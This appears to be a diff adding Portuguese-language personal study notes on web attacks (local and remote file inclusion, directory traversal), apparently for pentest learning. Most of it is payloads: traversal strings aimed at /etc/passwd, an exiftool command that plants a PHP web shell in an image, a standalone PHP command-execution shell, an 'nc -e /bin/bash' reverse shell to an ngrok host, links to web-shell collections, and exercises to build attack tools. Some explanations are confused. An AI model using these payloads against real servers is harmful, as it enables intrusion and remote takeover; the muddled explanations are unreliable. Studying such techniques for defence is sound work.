@@ -1,0 +1,85 @@
+
+- > LFI
+ 
+ exemplo 1: 
+  
+  www.xxx.com.br/index.php?page = nome-de-arquivo.php 
+  O argumento "page" está recebendo um arquivo.php. Acontece que você consegue incluir comandos dentro do argumento e ele ser executado. 
+    www.xxx.com.br/index.php?page = ../../../../../../../../etc/passwd
+    www.xxx.com.br/index.php?page = ../../../../../../../../root/phpinfo
+     
+     "page"/"file"
+     >observação: Nos dois exemplos supracitados, você executa comandos, inclui comandos no argumento, que já existe no servidor e ele é executado.<
+ ------------------
+ exemplo 2: 
+  
+  poderiamos subir um arquivo, por exemplo, foto.jpg malicioso usando o exiftool atráves de um formulário.
+  exemplos: 
+    exiftool -comment="<?php echo shell_exec(\$_GET[\"cmd\"]); ?>" imagem.jpeg, subiriamos arquivo que possui um código php para o servidor. 
+    agora que o servidor possui este arquivo, utilizaremos o mesmo para passar comandos (LFI).
+    
+    -inspecionar elemento 
+    -procurar pela foto que subimos para o servidor 
+    -clicar no diretorio da foto 
+    -imagem.jpeg?cmd = nc -e /bin/bash ip ngrok port 
+
+- > RFI 
+
+ exemplo 1: 
+  
+  www.xxx.com.br/index.php?page = site_que_possui_php_shell.txt 
+  No exemplo supracitado, você utiliza um site externo ( remoto ) para fazer uma shel ( RFI ) 
+ 
+ sites que possuem php shell:  
+   - > https://r57.gen.tr/
+   - > https://github.com/tennc/webshell 
+- Podemos pegar um site que possua uma shell interativa ( ou não ) e passar direto na url.
+-----------------
+ exemplo 2:
+  podemos criar em php um programa malicioso:
+  file.php
+  <?php
+	 echo shell_exec($_GET["comando"]);
+ ?>
+  depois iniciamos o apache2 e o arquivo e incluimos na url:
+  www.xxx.com.br/index.php?page = http://127.0.0.1/php/exploit.php?comando = nc  
+
+
+- > Directory Transversal 
+ 
+ exemplo: 
+  
+  www.xxx.com.br/index.php?page = file-text.php 
+  o argumento "page" que é um post ( faz requisições no servidor ) está recebendo um arquivo e fazendo a leitura. 
+  usando o burpsuits para atuar como proxy teriamos algo semelhante:
+  
+                           cliente < ----------------------------------------------------------- servidor 
+           www.xxx.com.br/index.php?page = file-text.php 
+                           cliente -------------------------- burpsuit ----------------------- > servidor
+           www.xxx.com.br/index.php?page = file-text.php 
+           *visualizando no burpsuit*
+           textfile: https:xxx&&file-text.php-submit-buttom
+           https:xxx - endereço 
+           file-text.php-submit-buttom - post 
+           ou seja, está passando uma url no post e fazendo a leitura 
+           
+           
+           
+           o que podemos fazer ? 
+           
+           
+           
+                  cliente ---------------------------------------------------------------------------- > servidor        
+           
+           mudar a url que o post está recendo e esperar o return.
+           exemplo:
+           google.com&&file-text.php-submit-buttom 
+           parametros injection: 
+           ../../../../../../../../etc/passwd
+  
+  
+        
+  
+desafios: 
+fazer um programa que identifique RFI/LFI e passe na url todos os comandos > https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/
+fazer um programa que passe uma url feita em php com escript malicioso na página web para fazer shell reversa ( o site utilizado tem que rodar no nosso navegador usando o apache ) 
